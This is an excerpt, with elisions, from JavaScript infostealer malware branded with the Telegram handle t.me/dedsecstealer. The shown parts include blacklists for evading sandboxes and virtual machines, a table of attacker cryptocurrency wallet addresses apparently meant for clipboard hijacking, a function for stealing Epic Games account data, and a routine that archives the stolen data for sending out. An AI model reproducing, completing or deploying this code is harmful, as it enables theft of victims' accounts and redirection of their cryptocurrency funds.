...
const blackListedHostname = ["BEE7370C-8C0C-4" ]
const blackListedUsername = ["WDAGUtilityAccount" ]
const blackListedGPU = ["Microsoft Remote Display Adapter" ]
const blacklistedOS = ["Windows Server 2022 Datacenter"]
const blackListedProcesses = ["watcher.exe"];
...
const addresses = {
    btc: "bc1qep620068tqv403fhync2gy2pgaf60pa5e52evx",
    eth: "0xa9DE59902f47A434Ef9a7b7df5Ec66F3cEC59F46",
    ltc: "ltc1qespzz2qgjgt95c2pqcf2puhfazmfyhw3ssdt20",
    trx: "TA8rC2LTABzrbA5cfHvyV6Ec7DLvYjXojs",
    bch: "qzxaw2hqe4a6me9jvszy6tx3cke94kcmksx2knwye4",
    xmr: "4BGeSynFw2FcGKC4Sgi2kndjDb97Gq2Hwavek41c6g9Q9tbRha5FDs9FJs55Fn2bVT5VvQu9ZkAuRYvCCLdb8Di2SPASGgf",
    xrp: "rNmtjpQbfwjBJySP4v6ov2k6HxBYAToTLo",
    zcash: "t1LSidEcK9SiKGEPKpJet1igeCrZCUUUYkb",
    doge: "DKTqrmMmMJ5uKMCbvpMUbqCiftorNzZPt6"
};
...
async function StealEpicGames() {
    try {
        ...
        if (fs.existsSync(epicPath)) {
            ...
            const howToUseContent = `<================[t.me/dedsecstealer Stealer]>================>\n\n
...
async function archiveAndSendData() {
    ...
    try {
        ...
        archive.addZipComment('All the Information was Stealed by t.me/dedsecstealer.');
